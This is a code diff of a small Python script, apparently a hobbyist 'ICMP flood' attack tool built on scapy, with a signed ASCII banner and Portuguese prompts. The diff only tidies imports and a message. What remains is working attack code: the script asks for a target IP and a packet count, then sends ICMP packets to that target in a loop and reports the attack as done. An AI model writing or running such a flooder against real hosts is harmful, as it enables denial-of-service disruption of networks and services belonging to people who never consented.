@@ -1,6 +1,3 @@
-import os
-import sys
-import random
 import time
 from scapy.all import IP, ICMP, send
 
@@ -18,7 +15,6 @@ ____   ____      .__   __   .__
   \     /  / __ \|  |_|    <|  ||  | \/\  ___/ 
    \___/  (____  /____/__|_ \__||__|    \___  >
                \/          \/               
-
 ---------------------------------
 |  Make by Jhon                |
 ---------------------------------
@@ -26,7 +22,7 @@ ____   ____      .__   __   .__
     for _ in range(packet_count):
         packet = IP(dst=target_ip)/ICMP()
         send(packet, verbose=False)
-        print(f"[+] Pacote enviado para {target_ip}")
+        print(f"[+] Pacote ICMP enviado para {target_ip}")
         time.sleep(0.1)
 
     print("[+] Ataque ICMP concluído!")
@@ -34,5 +30,4 @@ ____   ____      .__   __   .__
 if __name__ == "__main__":
     target_ip = input("IP do alvo: ")
     packet_count = int(input("Quantidade de pacotes: "))
-
     icmp_flood(target_ip, packet_count)
